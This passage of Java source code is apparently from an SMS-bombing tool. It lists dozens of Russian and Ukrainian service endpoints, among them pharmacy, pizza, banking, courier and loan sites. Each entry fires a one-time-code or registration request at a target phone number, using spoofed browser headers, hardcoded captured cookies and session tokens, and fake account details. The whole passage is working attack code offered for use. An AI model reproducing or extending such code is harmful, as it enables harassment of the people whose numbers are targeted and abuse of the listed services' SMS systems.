                                .add("Host", "planetazdorovo.ru")
                                .add("Sec-Fetch-Dest", "empty")
                                .add("Sec-Fetch-Mode", "cors")
                                .add("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"")
                                .add("sec-ch-ua-mobile", "?0")
                                .add("sec-ch-ua-platform", "\"Windows\"")
                                .add("Sec-Fetch-Site", "same-site")
                                .addUnsafeNonAscii("Cookie", "qrator_jsr=1677582740.566.In07njqCVZw5koqB-k1b092ul36om26ol7ajbmmvqgdhvbvj4-00; qrator_ssid=1677582740.999.bsbTQ9GJ8X3V7fdw-ke00ru45nn5p8jb1ovg1vk3sqh7lr9a4; qrator_jsid=1677582740.566.In07njqCVZw5koqB-jlkvgbqlci6fmb5mohn5c5ntrl85nemp; city_id=749807; city_xml=363; city=Москва и МО; city_code=moskva-i-mo; help_phone=(495) 369-33-00; order_phone=8 (495) 145-99-33; region=12; timezone=10800; show_bonus=1; region_id=16; PHPSESSID=OMzzD9XPBUsMvzhXaKHQLEoIWe7caD4H; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1677610740,\"UNIQUE\":[\"conversion_visit_day\"]}; _gcl_au=1.1.347187122.1677582744; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ga=GA1.2.360028804.1677582744; _gid=GA1.2.463013004.1677582744; tmr_lvid=f20e6d758cfa83ebe50bff36e0e4adaa; tmr_lvidTS=1661187312248; _dc_gtm_UA-126829878-1=1; _ym_uid=1661187313781808485; _ym_d=1677582745; _ym_isad=2; _ym_visorc=b; tmr_detect=0|1677582748986; carrotquest_session=npr74mk7dbi2tp94abgqye0sdfq01vmj; carrotquest_session_started=1; carrotquest_device_guid=350a2f93-ae05-4187-867c-16281e97040c; carrotquest_uid=1388102814265248160; carrotquest_auth_token=user.1388102814265248160.23139-c082d1441dfd0f22105416f38a.2dc58f4da60c0268408468b874082f4711e468538b1f82a9; carrotquest_realtime_services_transport=wss")
                                .addUnsafeNonAscii("X-Requested-With", "XMLHttpRequest")
                                .build());

                        builder.add("sessid", "f74d886e3df6be27574c309a0e9207da");
                        builder.add("phone", Phone.format(phone.getPhone(), "+7 (***) ***-****"));
                        builder.add("Login", "");
                    }
                },

                new JsonService("https://api.farfor.ru/v3/842b03f5-7db9-4850-9cb1-407f894abf5e/nn/auth/request_code/", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57");
                        request.header("Cookie", "cityId=23; sessionid=yxwpnnmtmfy2peeytvjo9kj3kiq2lv9n; rerf=AAAAAGP99PKfCoeNA8e0Ag==; _ga=GA1.2.277914625.1677587700; _gid=GA1.2.1785919836.1677587700; tmr_lvid=40677f5848edffde0fc28433bafe137f; tmr_lvidTS=1677587699936; _tt_enable_cookie=1; _ttp=R-8KDrOnkQJb2ZeLtJ0LsJ923uW; _ym_uid=1677587701806969337; _ym_d=1677587701; _ym_isad=2; _ym_visorc=b");

                        try {
                            return new JSONObject()
                                    .put("phone", phone.toString())
                                    .put("ui_element", "login")
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://sushi-star.ru/user/ajax2.php?do=sms_code", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("phone", Phone.format(phone.getPhone(), "8(***)***-**-**"));
                    }
                },

                new JsonService("https://vodnik.ru/signin/sms-request", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "s25a=u4ndvlp0r26durgi2uoj0ksmuc; s25shopuid=u4ndvlp0r26durgi2uoj0ksmuc; _gcl_au=1.1.1586843065.1677588634; sbjs_migrations=1418474375998=1; sbjs_current_add=fd=2023-02-28 15:50:34|||ep=https://vodnik.ru/|||rf=(none); sbjs_first_add=fd=2023-02-28 15:50:34|||ep=https://vodnik.ru/|||rf=(none); sbjs_current=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_first=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_udata=vst=1|||uip=(none)|||uag=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57; sbjs_session=pgs=1|||cpg=https://vodnik.ru/; _ga=GA1.2.2011946081.1677588634; _gid=GA1.2.324262795.1677588634; _dc_gtm_UA-34944982-1=1; _gat_UA-34944982-1=1; tmr_lvid=7bec5deb51717470cbe877180f97522b; tmr_lvidTS=1677588634426; _ym_uid=1677588635482671495; _ym_d=1677588635; adrdel=1; adrcid=Aj7OPttQx7VBI30FVh8R7-w; _ym_isad=2; _ym_visorc=w; tmr_detect=0|1677588637044");

                        try {
                            return new JSONObject()
                                    .put("phone", Phone.format(phone.getPhone(), "+7 ***-***-**-**"))
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://lk.zaim-express.ru/Account/RegisterCode", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", ".AspNetCore.Antiforgery.YwBUPdAxP0c=CfDJ8PIBqEVSjzpBkUhnd5gD6hRFuPIyWIRHvk7WETivIQ6sWgvFWBlhlxBZLkF9m3RzPUTfCsMjzrtG7aCPV5UNKgZLxrNX1fjoASszqEbsTFrsrtGrrUG1a39yMwd3nukdHGcT7lWPS0oT03Tlxy3OHgs; .LoanExpress.Session=CfDJ8PIBqEVSjzpBkUhnd5gD6hRUjVIXcF7Qjk/vsPeRrReI8/HQCyyoseAycjzquMGXWrEm+3B40xCyUZf+FTEPgEK3CABKs5Sq62hakDyY0nvB7coA9s89XvA5l4NsLfQ2bkXnvNRRqLfNS5r//ULnFlsBkb5J3Mto6d0cYaSNZTE1; _ym_uid=1677588936312422059; _ym_d=1677588936; _ym_isad=2; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _gid=GA1.2.484481173.1677588936; _ym_visorc=b; _ga_2JB47PMSVE=GS1.1.1677588936.1.1.1677589010.0.0.0; _ga=GA1.2.1772293061.1677588936; _gat_gtag_UA_76114749_2=1");

                        builder.add("CellNumber", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                    }
                },

                new JsonService("https://ipizza.ru/gql", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        return "{\"query\":\"mutation sendPhone($domain:ID!,$phone:String!,$recaptcha:String){phone(number:$phone,region:$domain,recaptcha:$recaptcha){token error{code message}}}\",\"variables\":{\"domain\":\"msk\",\"phone\":\"" + phone + "\"}}";
                    }
                },

                new JsonService("https://clientsapi01w.bk6bba-resources.com/cps/superRegistration/createProcess", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        return "{\"fio\":\"\",\"password\":\"gewgerwgergewrger3t\",\"email\":\"\",\"emailAdvertAccepted\":true,\"phoneNumber\":\"+" + phone + "\",\"webReferrer\":\"\",\"advertInfo\":\"ga_client_id=GA1.1.1519138250.1677588511\",\"platformInfo\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57\",\"promoId\":\"\",\"ecupis\":true,\"birthday\":\"1982-02-01\",\"sysId\":1,\"lang\":\"ru\",\"appVersion\":\"4.21.1\",\"deviceId\":\"F00A7159477F67B7B4FA0EE3B0C02A2F\"}";
                    }
                },

                new FormService("https://semena-partner.ru/ajax/getPhoneCodeReg.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "PHPSESSID=8Kg3rH9a1vAjAJOAq7zi3nXb90jwzcGQ; BITRIX_SM_lonCookie=1677589657; BITRIX_SM_lonCookieCondition=c0; _ym_uid=1677589660863243211; _ym_d=1677589660; _ga=GA1.2.322385156.1677589660; _gid=GA1.2.198810140.1677589660; _gat=1; rrpvid=607519930160743; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; rcuid=6275fcd65368be000135cd22");
                        request.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57");

                        request.header("Sec-Fetch-Dest", "empty");
                        request.header("Sec-Fetch-Mode", "cors");
                        request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                        request.header("sec-ch-ua-mobile", "?0");
                        request.header("sec-ch-ua-platform", "\"Windows\"");
                        request.header("Sec-Fetch-Site", "same-site");

                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("phone", Phone.format(phone.getPhone(), "+7(***) ***-**-**"));
                    }
                },

                new FormService("https://agro-market24.ru/ajax/auth.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("newrelic", "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI2MzE0NDciLCJhcCI6IjI4OTc1NjMyNiIsImlkIjoiYjk0YWNjYjM3NmJkYTQyOSIsInRyIjoiNmYwMmQ4YTY3MTU0YzY2MDZhMTMzMTM3YzgxMmRiODAiLCJ0aSI6MTY3NzU4OTkwNTAyMH19");
                        request.header("traceparent", "00-6f02d8a67154c6606a133137c812db80-b94accb376bda429-01");
                        request.header("x-newrelic-id", "VgAEUFJXDxACV1NQAwADXlE=");
                        request.header("tracestate", "2631447@nr=0-1-2631447-289756326-b94accb376bda429----1677589905020");

                        builder.add("mode", "reg");
                        builder.add("phone", Phone.format(phone.getPhone(), "+7(***)*******"));
                        builder.add("name", getUserName());
                        builder.add("email", getEmail());
                        builder.add("code", "0");
                    }
                },

                new JsonService("https://api.starterapp.ru/bdbar/auth/resetCode", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("sessionid", "74b74767-244a-42ef-acd7-bc38916e79f4");
                        request.header("authcode", "");
                        request.header("lang", "ru");

                        try {
                            return new JSONObject()
                                    .put("phone", phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://tashirpizza.ru/ajax/mindbox_send_sms", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("phone", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                        builder.add("smsType", "simple");
                    }
                },

                new FormService("https://tehnoskarb.ua/register", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "_gcl_au=1.1.380904791.1677590803; _ga=GA1.1.701174307.1677590803; _fbp=fb.1.1677590804301.1176961182; dashly_device_guid=2d44a8af-e1f3-4593-8022-a11e7adbbb00; dashly_uid=1388170375157778425; dashly_auth_token=user.1388170375157778425.4561-b2b6523d280093ec133617ae010.afed4a86ba8fb4479c4c3691c66b893b1894e3b00906f209; dashly_session=kdsomp5khudhjyvq65o67afezvy8vmaz; dashly_session_started=1; dashly_realtime_services_transport=wss; _ga_1P2E8RZQPX=GS1.1.1677859782.3.1.1677859804.38.0.0");

                        builder.add("name", getUserName());
                        builder.add("email", getEmail());
                        builder.add("phone", Phone.format(phone.getPhone(), "+380(**)***-**-**"));
                        builder.add("password", "fwe31434123Q");
                        builder.add("confirmPassword", "fwe31434123Q");
                        builder.add("subaction", "saveUser");
                    }
                },

                new ParamsService("https://www.vodovoz-spb.ru/udata/users/user_phone/.json", 7) {
                    @Override
                    public void buildParams(Phone phone) {
                        builder.addQueryParameter("phone", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                    }
                },

                new FormService("https://hvalwaters.ru/register/send-sms-code/", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("X-CSRF-TOKEN", "3K03ra96n2jDeCKVSuCtdbY26MEFSBAcAIrrPYM4");
                        request.header("X-Requested-With", "X-Requested-With");
                        request.header("Cookie", "gid=eyJpdiI6IlJBL3liZFpRYkRVWWVWSi9CRVdyQ0E9PSIsInZhbHVlIjoiNzJ2eWVBMnJCblFKcm4vQzhIOWFBTVA3a0drTkI5clF2bnhLaE9WdFdBclRnNGJYbGpKc2d3c1RQL3YzZUp3eWJCQklFTUJIWU9UelhhODhwRXdaaGdLUFpkZzlzODVSRHhRcm9IaEpiNjg9IiwibWFjIjoiMjdiZDJkY2QxZmMyMDRmZjViYjdkMzk1Zjg4Njk0OTQ2OGE0NDJlYzEzODRhYjU2MTkwZTY1NWJmZDFiOTRhNCIsInRhZyI6IiJ9; show_mobile_block_app_2=eyJpdiI6IlJiZ0tqK1lOVEZqdzVEZldhRFJmZ3c9PSIsInZhbHVlIjoiOFJQY1RSdlR3a3RYaDhGZExpalF5TzdOd1B5ZmZUTkt0MEg4cUcweG1HcUFDall3VFBHcGdpd3RmalUzd1MyYyIsIm1hYyI6ImM3NzU0OWM2ZjIyZDc0YWIzYzI0OTU0NjUzM2Q2MDhhOTVkMThlMTBiZDg1YTc1MDA5YmEzYmViNTkyYmM1ZTMiLCJ0YWciOiIifQ==; tmr_lvid=d046a1a213cc8bbe63676e94de623dc7; tmr_lvidTS=1680709392744; XSRF-TOKEN=eyJpdiI6IjE1bmg1bjhYOFVhU1lRMFpZMC9SaFE9PSIsInZhbHVlIjoiMHFDTll1Y1lxNCt5dlMzSFI3enhkdUhoUjBsbENZSWtPdDFEUGplK3d0Um1aelJHVERLSGVJWWJpUFJCUDVjbzF6RWo0K1NkVGZaaWtaeGFnMHdRc21nNEhvd0huZEVoSGRCU0FQSmF1Q2VndzBHZ3QzOWk5SmxmSjN3T1ZUTXUiLCJtYWMiOiJiNzlkMWI3MjEzMmMxMGZlZDI5Y2Y2NWY1MDUzYjQ1ZTgwYWQzNjM1NTFhYjRhYmVkYzdkZGI3ZDJiOTZmMjU2IiwidGFnIjoiIn0=; xvalovskie_vody_session=eyJpdiI6InIvMnVHSjBOcWl2bTFjOU03QjNBVWc9PSIsInZhbHVlIjoiWFBGZ2oyVmp4d2xYS3FaSkNPZEZrTEJNUzNEcmFwU0pUOTBnVTIxWFdlWnJ1Tll4VStvdkxXRU0vK3l4RVhwMXF5RnBaVjVoaldMRkpJOVg0YVNDREc5TUg5dzBENiswYitjTCtHZytnaWNsRlJZSEw1QXJCYWp3dG5xWncwbXYiLCJtYWMiOiJmNjZlMDQ2YmUzOWY2NGMyZTY1Y2ViZDU5MzZiZDdlY2NkYmZhM2U1ZGFjZjI4N2VmZTk2ZDdkMjYyNTU5ODAxIiwidGFnIjoiIn0=; wcid=eyJpdiI6IitFVGZvQzJFK1VmQzUvaGcySWhiNEE9PSIsInZhbHVlIjoiNWNFeVJ2U05sUWthNGVjOTdZVzMxUDlWQnhZeC9ST3JML2FJbHNmaUllT1ZDVWFWaXFpZVI5SThpQlRnMkhEQSIsIm1hYyI6IjhhNTU0ZGFlYTZjYzcwMGI1ZWM0MTAzNmU3NDMxZmYyMTE5N2Q2YjcwZGNlYjYzNTc3ZjUxOGVhZjYxMTliOTgiLCJ0YWciOiIifQ==; _ga=GA1.2.664543174.1680709393; _gid=GA1.2.1486154669.1680709393; _gat_gtag_UA_44138349_1=1; _ym_uid=1680709393637923039; _ym_d=1680709393; _ym_visorc=w; _ym_isad=2; cted=modId=7ed2229d;client_id=664543174.1680709393;ya_client_id=1680709393637923039; tmr_detect=0|1680709399967");

                        builder.add("phone", Phone.format(phone.getPhone(), "7(***) ***-****"));
                    }
                },

                new FormService("https://rf.driptip.ru/signup/", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "__ddg1_=ZmQtjxk6pvG7jkNta5vd; PHPSESSID=vmpoeb2lj1g04fbhatcg6e7rd0; landing=/signup/; buyerstat__id=642d97ec83b5e; user_agent=desktop; _ym_uid=1680709614211847501; _ym_d=1680709614; _ym_isad=2; _ga_FN3XP284GB=GS1.1.1680709614.1.0.1680709614.0.0.0; _ga=GA1.2.1147869418.1680709614; _gid=GA1.2.1503340979.1680709614; _gat_gtag_UA_56207650_1=1");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("data[firstname]", getUserName());
                        builder.add("data[email]", getEmail());
                        builder.add("data[phone]", "+" + phone);
                        builder.add("data[birthday][day]", "14");
                        builder.add("data[birthday][month]", "4");
                        builder.add("data[birthday][year]", "2001");
                        builder.add("wa_json_mode", "1");
                        builder.add("need_redirects", "1");
                        builder.add("contact_type", "person");
                    }
                },

                new MultipartService("https://api.nbcomputers.ru/api/user/registration", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.addFormDataPart("phone", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        client.newCall(new Request.Builder()
                                .url("https://api.nbcomputers.ru/api/user/registration")
                                .post(RequestBody.create("------WebKitFormBoundaryAhgEzNl6lSOnl6vr\n" +
                                        "Content-Disposition: form-data; name=\"phone\"\n" +
                                        "\n" +
                                        phone.format("+7 (***) ***-**-**") +
                                        "\n------WebKitFormBoundaryAhgEzNl6lSOnl6vr--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryAhgEzNl6lSOnl6vr")))
                                .build()).enqueue(callback);
                    }
                },

                new JsonService("https://online.sberbank.ru/CSAFront/uapi/v2/authenticate", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Accept", "application/json, text/plain, */*");
                        request.header("Origin", "https://online.sberbank.ru");
                        request.header("Sec-Fetch-Dest", "empty");
                        request.header("Sec-Fetch-Mode", "cors");
                        request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                        request.header("sec-ch-ua-mobile", "?0");
                        request.header("sec-ch-ua-platform", "\"Windows\"");
                        request.header("Sec-Fetch-Site", "same-site");
                        request.header("Referer", "https://online.sberbank.ru/");
                        request.header("Cookie", "f5avraaaaaaaaaaaaaaaa_session_=LMKFMKCFCKBBCDHGIDBNHFEIFEBIIGCKJNNOLHNDNDGPOAIPMNBMFDPHMKNGKLCPGCKDFLKHOKEMKLDNJGJAAEBFHJPHHJJDNMHIDFMAICPGDHENNNCDBCKOMIEHDHJL; ESAWEBJSESSIONID=PBC5YS:-1592978582; ESAUAPIJSESSIONID=PBC5YS:-1401443471; TS0135c014=0156c5c8603d42898e476b45b51aabb2a8f79520eb39fba20032e067b52aeec7ca69ebbd8e169e3274802a949082e444146ea45b28ce3e31994e88487c5b66404b08a8d711091f5821afd2f2c333998ed232338bd8; sbid_save_login=false; TS014759d1=0156c5c8600f8ab0efc50bbb13a458c79226cd158039fba20032e067b52aeec7ca69ebbd8e873067a3be306fcf1fc744b54d4fae7ea19aa19b71ab2d7c1a36faf61b452febc67f38094bdf208b5aef292d91cf61858a8abeb0a2798801e862233cdc7c50e433360f80eed46e6358c40efad04d37b5514d2adc9e428b8ab16be5a1a422bef8; _sv=SA1.8ed47a79-c4ce-4990-a3b9-702d969ab535.1670155776; _gcl_au=1.1.1368651913.1680710321; _ym_uid=165997501787354883; _ym_d=1680710321; _sa=SA1.415cad68-bd50-44ad-9873-3e21cca1b7e0.1680710321; tmr_lvid=fe45132553fe9d1cacfd3293ecfac8c2; tmr_lvidTS=1659975017497; _ym_isad=2; top100_id=t1.3122244.1104513110.1680710321533; adtech_uid=4cb771be-35b5-4398-bda2-a2e5bec91512:sberbank.ru; adrdel=1; adrcid=A2h_BfB_cAeLGOfEv5sJZFw; t2_sid_3122244=s1.362560733.1680710321535.1680710325559.1.11.11; JSESSIONID=node0elr4dl5la6p3opwxbogk0eyh11444053.node0; sb-sid=26aca1a7-e98d-4ce8-bb37-dbcec0970f2c; sb-id=gYEl6L3DkLtDBreaGke0twO_AAABh1IkW1O0fIbpW5dFW7L4ClXYigu3JP0qgdT-kxg3jxH0E-gpnTI2YWNhMWE3LWU5OGQtNGNlOC1iYjM3LWRiY2VjMDk3MGYyYw; sb-pid=gYFSXfnWV2pE4ISEQGXI82ccAAABh1IkW1N_DuqFUvibhqECoTB97tQmdGCXZcmJ-ADw9w9aiOYIIA; _sas=SA1.415cad68-bd50-44ad-9873-3e21cca1b7e0.1680710321.1680710329; UAPIJSESSIONID=node0o03mgi79yllsawxtnl4r6bl42517498.node0; sbrf.pers_sign=0; TS019e0e98=0156c5c860b7d7da03b7f51385dfd60554e906c61039fba20032e067b52aeec7ca69ebbd8e873067a3be306fcf1fc744b54d4fae7ea19aa19b71ab2d7c1a36faf61b452feb3440e06dc44ae286826814333a90a448c21074fa0c6a00cbcc07555a8192f2dc2740c50a7597ab671ba789c6aeb5f4bcbd66982f6eafeb75b46ddcfd2b3f6a9c; TS019a42f2=0156c5c860a908faaa555abcfe63a6befa9aa5458439fba20032e067b52aeec7ca69ebbd8e873067a3be306fcf1fc744b54d4fae7ea19aa19b71ab2d7c1a36faf61b452febc67f38094bdf208b5aef292d91cf61858a8abeb0a2798801e862233cdc7c50e4599951af491f02d3f381bc84a363ed3f776296a421fb2d06ab15559b314bc92e; TS019e0e98030=01e9874edf1cfda0bef4ced6a4d030508452c212d7ee41ebe13a58632b85bbea9ba07dc27259da1f260d5df6c39fd7a0e483ad940c; TS3bb85bd7027=08bd9624b8ab2000660a77af35bf89cf80ffc33769930767dc909391c1385ce25ef34e54dec1cef708bb4760f51130003f1023d9e81eb651e6a03b158cdb4d0514bd448afa45a2f9fd46dac25d2c3585e1c35c3256791b2661002600e2cd6b48");
                        request.header("Process-ID", "b356eea04fdf424a8a14337113d22631");
                        request.header("X-TS-AJAX-Request", "true");

                        return "{\"identifier\":{\"type\":\"phone\",\"data\":{\"value\":\"" + phone + "\"}},\"authenticator\":{\"type\":\"sms_otp\",\"data\":{}},\"channel\":{\"type\":\"web\",\"user_type\":\"private\",\"data\":{\"rsa_data\":{\"dom_elements\":\"\",\"htmlinjection\":\"\",\"manvsmachinedetection\":\"\",\"js_events\":\"\",\"deviceprint\":\"version=1.7.3&pm_br=Chrome&pm_brmjv=108&iframed=0&intip=&pm_expt=&pm_fpacn=Mozilla&pm_fpan=Netscape&pm_fpasw=internal-pdf-viewer|internal-pdf-viewer|internal-pdf-viewer|internal-pdf-viewer|internal-pdf-viewer&pm_fpco=1&pm_fpjv=0&pm_fpln=lang=ru|syslang=|userlang=&pm_fpol=true&pm_fposp=&pm_fpsaw=1536&pm_fpsbd=&pm_fpsc=24|1536|864|816&pm_fpsdx=&pm_fpsdy=&pm_fpslx=&pm_fpsly=&pm_fpspd=24&pm_fpsui=&pm_fpsw=&pm_fptz=3&pm_fpua=mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/108.0.0.0 safari/537.36|5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36|Windows&pm_fpup=&pm_inpt=&pm_os=Windows&adsblock=0=false|1=false|2=false|3=false|4=false&audio=baseLatency=0.01|outputLatency=0|sampleRate=44100|state=suspended|maxChannelCount=2|numberOfInputs=1|numberOfOutputs=1|channelCount=2|channelCountMode=max|channelInterpretation=speakers|fftSize=2048|frequencyBinCount=1024|minDecibels=-100|maxDecibels=-30|smoothingTimeConstant=0.8&pm_fpsfse=true&webgl=ver=webgl2|vendor=Google Inc. (AMD)|render=ANGLE (AMD, AMD Radeon(TM) Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)\"},\"oidc\":{\"scope\":\"address_reg birthdate email mobile name openid verified\",\"response_type\":\"code\",\"redirect_uri\":\"https://profile.sber.ru\",\"state\":\"43c54272-1a34-4c6f-a470-52bd53bd1e1c\",\"nonce\":\"34c136bb-7f07-492b-8f13-3d162a5ae7ba\",\"client_id\":\"2679efe6-f358-4378-b328-45dfcc4a006a\",\"referer_uri\":\"https://profile.sber.ru/\"},\"browser\":\"Chrome\",\"os\":\"Windows 10\"}}}";
                    }
                },

                new ParamsService("https://apis.flowwow.com/apiuser/auth/sendSms/") {
                    @Override
                    public void buildParams(Phone phone) {
                        builder.addQueryParameter("phone", "+" + phone);
                        builder.addQueryParameter("user_type", "client");
                        builder.addQueryParameter("lang", "ru");

                        request.header("Sec-Fetch-Dest", "empty");
                        request.header("Sec-Fetch-Mode", "cors");
                        request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                        request.header("sec-ch-ua-mobile", "?0");
                        request.header("sec-ch-ua-platform", "\"Windows\"");
                        request.header("Sec-Fetch-Site", "same-site");

                        request.header("Referer", "https://flowwow.com/");
                        request.header("Origin", "https://flowwow.com");
                    }
                },

                new JsonService("https://www.cdek.ru/api-site/auth/send-code", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "_ym_uid=1681049809433520032; _ym_d=1681049809; _ym_isad=2; cityid=1759; sbjs_migrations=1418474375998=1; sbjs_current_add=fd=2023-04-09 17:16:49|||ep=https://www.cdek.ru/ru/|||rf=(none); sbjs_first_add=fd=2023-04-09 17:16:49|||ep=https://www.cdek.ru/ru/|||rf=(none); sbjs_current=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_first=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_udata=vst=1|||uip=(none)|||uag=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36; sbjs_session=pgs=1|||cpg=https://www.cdek.ru/ru/; _ym_visorc=b; _ga=GA1.2.778360079.1681049810; _gid=GA1.2.629305455.1681049810; _gat_UA-4806124-1=1; tmr_lvid=7653af96d3bc11f6b8066e3ac0663428; tmr_lvidTS=1681049809839; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _fbp=fb.1.1681049809933.1196859599; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _tt_enable_cookie=1; _ttp=j567hcxgZMrL8i_BzsrwDS81Zl3; flomni_5d713233e8bc9e000b3ebfd2={\"userHash\":\"b7ea40fa-0bfe-491f-bbae-f151c2a9810e\"}; tmr_detect=0|1681049812179");

                        return "{\"locale\":\"ru\",\"websiteId\":\"ru\",\"phone\":\"+" + phone + "\",\"token\":null}";
                    }
                },

                new FormService("https://citystarwear.com/bitrix/templates/bs-base/php/includes/bs-handlers.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("cookie", "PHPSESSID=UuKiYPniPAdXVBBtNljDS7UPZdha49Cc; I_BITRIX2_SM_bsSiteVersionRun=D; I_BITRIX2_SM_SALE_UID=fa184708de2bc9dd79e83a8055c6177d; _ga=GA1.2.2134493673.1681050316; _gid=GA1.2.1923476411.1681050316; _gat=1; _gat_gtag_UA_107697781_1=1; _ym_uid=1681050316671922748; _ym_d=1681050316; tmr_lvid=b8f88e748040d447a7dd09460adb4d95; tmr_lvidTS=1681050315683; _ym_isad=2; _ym_visorc=w; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; roistat_visit=184510; roistat_first_visit=184510; roistat_visit_cookie_expire=1209600; cto_bundle=29NzTF9uUDJTYWo2N0E1QWJTVm9FZnZTd2FTTDk1SFNjN2dYdG0wb0s4bFNkNktnZHpMa1ElMkJybCUyQnUlMkJ5SHA4aEtZWUozSXpaRWowSXZtRUVuYmF6MFdsNDBhaFJsM2VIVnRzUTUlMkZCdFpmM0JIVDJjbXcyeHJmMXdCMEhsN1dqVks1OGhs; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit; ___dc=975af4da-b307-4c03-a397-86b1121a74e1; tmr_detect=0|1681050317970;");

                        builder
                                .add("phone", phone.getPhone())
                                .add("hdlr", "bsSendCallCode")
                                .add("key", "DOvBhIav34535434v212SEoVINS")
                                .add("dataForm[phone]", phone.getPhone())
                                .add("dataForm[callNums]", "")
                                .add("dataForm[smsCode]", "")
                                .add("dataForm[email]", "")
                                .add("dataForm[ecode]", "")
                                .add("O3Clz", "ZXrHlWj8wGf8qVwyImyJnbYZY")
                                .add("7UxNZ", "1wYb5BjwpiyXHUWijh8vdvMj8")
                                .add("Bvmeh", "lgrCt3RBmF2iB9Q8rV3KCM2fT")
                                .add("7Mwtq", "Ll4RkH341728SQPCZ4mrjo7AD")
                                .add("05NkY", "Shtl9WZihZuuMY43uUcF4TqJ2")
                                .add("N9n3d", "cQibFHON1g0i3yOHLsOjhv0pW")
                                .add("KNaaw", "02UVQnrFFLxTD1EJ2Q7X9YeGo")
                                .add("33f0Q", "QbpHWRptZudzLK88H5uhLnPuB")
                                .add("NLqjP", "V2KdwIrmw09pQJRSWXUwM2PuU")
                                .add("JqHV2", "aKmpJNgOHDoJrZ8xLT7vMaJur");
                    }
                },

                new FormService(" https://lk.zaim-express.ru/Account/RegisterCode", 7) {
                    @Override
                    public void buildBody(Phone phone) {
